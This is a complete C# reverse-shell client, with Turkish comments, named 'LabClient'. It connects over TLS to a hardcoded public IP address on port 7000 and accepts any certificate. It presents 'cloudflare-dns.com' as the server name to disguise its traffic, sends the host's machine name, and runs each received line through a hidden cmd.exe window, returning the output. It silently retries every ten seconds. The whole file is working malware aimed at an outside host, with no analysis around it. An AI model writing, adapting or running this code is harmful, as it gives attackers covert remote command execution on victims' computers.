using System;
using System.Net.Sockets;
using System.Net.Security; // SSL için gerekli
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.IO;
using System.Diagnostics;
using System.Threading;

public class LabClient {
    // Sertifika doğrulamasını her zaman 'true' döndürerek atla (Self-signed sertifikalar için)
    public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) {
        return true; 
    }

    public static void Main() {
        string targetIP = "185.194.175.132";
        int targetPort = 7000;

        while (true) {
            try {
                TcpClient client = new TcpClient(targetIP, targetPort);
                
                // SSL katmanını oluştur
                SslStream sslStream = new SslStream(
                    client.GetStream(), 
                    false, 
                    new RemoteCertificateValidationCallback(ValidateServerCertificate), 
                    null
                );

                // Sunucuya güvenli şekilde bağlan
                sslStream.AuthenticateAsClient("cloudflare-dns.com"); 

                using (StreamReader reader = new StreamReader(sslStream))
                using (StreamWriter writer = new StreamWriter(sslStream) { AutoFlush = true }) {
                    
                    writer.WriteLine("--- SSL Baglantisi Kuruldu: " + Environment.MachineName + " ---");

                    while (client.Connected) {
                        string cmd = reader.ReadLine();
                        if (string.IsNullOrEmpty(cmd)) break;

                        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
                        psi.RedirectStandardOutput = true;
                        psi.RedirectStandardError = true;
                        psi.UseShellExecute = false;
                        psi.CreateNoWindow = true;

                        using (Process p = Process.Start(psi)) {
                            string output = p.StandardOutput.ReadToEnd();
                            string error = p.StandardError.ReadToEnd();
                            writer.WriteLine(output + error + "\nSHELL> ");
                        }
                    }
                }
            }
            catch (Exception ex) {
                // Hata durumunda bekle ve tekrar dene
                Thread.Sleep(10000);
            }
        }
    }
}
